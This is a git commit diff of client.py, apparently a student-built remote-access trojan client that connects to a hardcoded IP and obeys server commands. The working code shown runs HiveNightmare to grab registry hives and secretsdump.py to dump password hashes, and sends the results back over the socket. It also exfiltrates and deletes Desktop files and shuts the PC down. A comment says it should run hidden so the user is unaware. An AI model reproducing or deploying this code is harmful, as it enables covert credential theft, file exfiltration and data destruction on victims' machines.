4525bdfe970c781c6a3156ad5c82d97bf7cb6627
ThanosTsalafoutas <82948982+ThanosTsalafoutas@users.noreply.github.com>
2022-06-19 22:04:40 +0200

    Update client.py

--- client.py
+++ client.py
@@ -14,28 +14,24 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("10.0.26.244", 1234))
 # this file should be run in the background so the person using the pc is not aware of the process running
 # For this to happen, use the extension.pyw,
-# which will cause the script to be executed by pythonw.exe by default.
-# This prevents the terminal window from appearing when the computer is first booted.
-# https://coduber.com/run-python-script-constantly-in-background/
+
+#Communication is mostly done by server sending a message and a client responding, except for sending a file
 
 
-# Additionally, we also want to look at making the tool automatically boot up on start up.
-# This can be done by adding the exe on the start-up directory but not essential
-
-# For the cmd part
-# https://www.stackvidhya.com/execute-system-command-or-shell-command-python/
-# https://datatofish.com/command-prompt-python/
 
 while (True):
     msg = s.recv(1024)
     decodedMsg = msg.decode("utf-8")
     print(decodedMsg)
+    
+    # The command shuts down the pc so avoid running it
     if decodedMsg == "s":
         print('Shutting Down')
         #send confirmation
         s.sendall(bytes("shutting down","utf-8"))
         os.system("shutdown /s /t 1")
-        # The command shuts down the pc so avoid running it
+    
+    #Opens Calculator   
     elif decodedMsg == "openCalc":
         os.system('cmd /c "calc"')
         s.sendall(bytes("opened calc","utf-8"))
@@ -44,10 +40,7 @@ while (True):
         dir = "C:" + "\\" + "Users" + "\\" + os.getlogin() + "\\" + "Desktop"
         result = subprocess.run("dir", cwd=dir, stdout=subprocess.PIPE, shell=True)
         s.sendall(bytes(result.stdout.decode(), "utf-8"))
-    # elif decodedMsg == "test1":
-    #     command = "dir Desktop & echo 'All the files and folders are listed'"
-    #     result = subprocess.run(command, stdout=subprocess.PIPE, shell=True)
-    #     s.sendall(bytes(result.stdout.decode(), "utf-8"))
+
 
     # code to retrieve the registry files (hives)
     elif decodedMsg == "retrieveh":
@@ -55,6 +48,7 @@ while (True):
         cmdline = "start .\HiveNightmare.exe"
         subprocess.call(cmdline, cwd=dir, shell=True) # run `cmdline` in `dir`
         s.sendall(bytes("done", "utf-8"))
+        
     # dump the hashes and send them via the connection
     elif decodedMsg == "hashdump":
         dir = "C:" + "\\" + "Users" + "\\" + os.getlogin() + "\\" + "Downloads"
@@ -72,27 +66,28 @@ while (True):
         cmdline2 = "python secretsdump.py -system " + systemN + " -security " + securityN + " -sam " + samN + " local"
         resulth = subprocess.run(cmdline2, cwd=dir, stdout=subprocess.PIPE, shell=True)
         print(resulth.stdout.decode())
-        s.sendall(bytes(resulth.stdout.decode(), "utf-8"))
-        #s.sendall(bytes(samN, "utf-8"))  
-    # just a response so we don't break the message response pattern  
+        s.sendall(bytes(resulth.stdout.decode(), "utf-8"))  
+        # just a response so we don't break the message response pattern  
+    
+    
     elif decodedMsg == "getaccess":
         s.sendall(bytes("nice", "utf-8"))
-    # https://docs.python.org/3/library/subprocess.html#subprocess.Popen.communicate here we can see that we can get
-    # output from certain executions, so maybe we can use this to execute commands one by one could include like
-    # command and then choose which command to use
-    #https://www.computerhope.com/issues/chusedos.htm
 
+    #sends the available files and then the user can type the file or cancel to return
     elif decodedMsg == "SendFiles-Desktop":
         dir =  "C:" + "\\" + "Users" + "\\" + os.getlogin() + "\\" + "Desktop"
         result = subprocess.run("dir", cwd=dir, stdout=subprocess.PIPE, shell=True)
         s.sendall(bytes(result.stdout.decode(), "utf-8"))
         msg = s.recv(1024)
         decodedMsg = msg.decode("utf-8")
+        #returns back
         if decodedMsg == "cancel":
             s.sendall(bytes("cancelled", "utf-8"))
 
         else:
             file = dir + "\\" + decodedMsg
+            #rb needed for sending binary file
+            #only used for text files 
             f = open(file, "rt")
             message = f.read(2048)
             while message:
@@ -102,9 +97,8 @@ while (True):
             f.close()
             s.sendall(bytes("done sending","utf-8"))
             
-            #https: // stackoverflow.com / questions / 27241804 / sending - a - file - over - tcp - sockets - in -python
-            #rb needed for sending binary file
-
+    #select a file to delete 
+    #similar to SendFiles-Desktop
     elif decodedMsg == "DeleteFiles-Desktop":
         dir = "C:" + "\\" + "Users" + "\\" + os.getlogin() + "\\" + "Desktop"
         result = subprocess.run("dir", cwd=dir, stdout=subprocess.PIPE, shell=True)
@@ -116,14 +110,16 @@ while (True):
 
         else:
             command = "del " + decodedMsg
-            #might not need shell and stdout
             subprocess.run(command, cwd=dir, stdout=subprocess.PIPE, shell=True)
             s.sendall(bytes("File Deleted", "utf-8"))
-
+            
+    #https://www.lifewire.com/what-is-telnet-2626026#toc-telnet-games--additional-information
+    #This must be enabled in the VM to work
     elif decodedMsg == "maytheforcebewithyou":
         s.sendall(bytes("memed", "utf-8"))
         os.system("start cmd /c telnet towel.blinkenlights.nl")
-
+        
+    #if message does not match any of the cases above
     else:
         s.sendall(bytes("Invalid Command", "utf-8"))
 
